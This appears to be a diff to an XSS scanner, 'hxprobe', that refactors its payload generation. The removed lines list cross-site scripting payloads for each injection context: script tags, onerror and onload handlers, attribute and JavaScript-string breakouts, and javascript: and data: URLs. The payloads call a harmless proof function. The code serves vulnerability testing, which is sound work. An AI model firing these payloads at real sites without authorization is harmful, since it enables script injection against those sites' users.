@@ -104,53 +104,13 @@ def detect_context(body: str, marker_offset: int) -> Detected:
 
 # -- payloads --------------------------------------------------------------
 
-def payloads_for(ctx: Context, pid_marker: str = "hxprobe") -> list[str]:
+def payloads_for(ctx: Context, pid_marker: str = "hxprobe",
+                 engine: str = "xss") -> list[str]:
     """Ordered payloads for a context. {M} is replaced by the probe marker."""
-    a = f"window.__hx_proof('{pid_marker}')"
+    from hx.payload_loader import get_payload_set
 
-    table: dict[Context, list[str]] = {
-        Context.HTML_BODY: [
-            f"<script>{a}</script>",
-            f"<img src=x onerror={a}>",
-            f"<svg onload={a}>",
-        ],
-        Context.ATTR_DOUBLE: [
-            f'"><script>{a}</script>',
-            f'" onmouseover="{a}" x="',
-            f'"><img src=x onerror={a}>',
-        ],
-        Context.ATTR_SINGLE: [
-            f"'><script>{a}</script>",
-            f"' onmouseover='{a}' x='",
-            f"'><img src=x onerror={a}>",
-        ],
-        Context.ATTR_UNQUOTED: [
-            f" onmouseover={a} x=",
-            f"><script>{a}</script>",
-        ],
-        Context.JS_STRING_DOUBLE: [
-            f'";{a};//',
-            f'";{a};var x="',
-            f"\\';{a};//",          # escaped-quote fallback
-        ],
-        Context.JS_STRING_SINGLE: [
-            f"');{a};//",
-            f"';{a};//",
-            f"';{a};var x='",
-        ],
-        Context.SCRIPT_BLOCK: [
-            f";{a};//",
-            f"{a};//",
-            f"*/{a}/*",
-        ],
-        Context.URL_ATTR: [
-            f'"><script>{a}</script>',
-            f"javascript:{a}",
-            f"javascript:{a}//",
-            f"data:text/html,<script>{a}</script>",
-        ],
-    }
-    return table.get(ctx, table[Context.HTML_BODY])
+    texts = get_payload_set(engine).ordered_payloads(ctx)
+    return [text.replace("{M}", pid_marker) for text in texts]
 
 def control_payload_for(payload: str) -> str | None:
     """Return a syntax-preserving benign control for an hx proof payload.
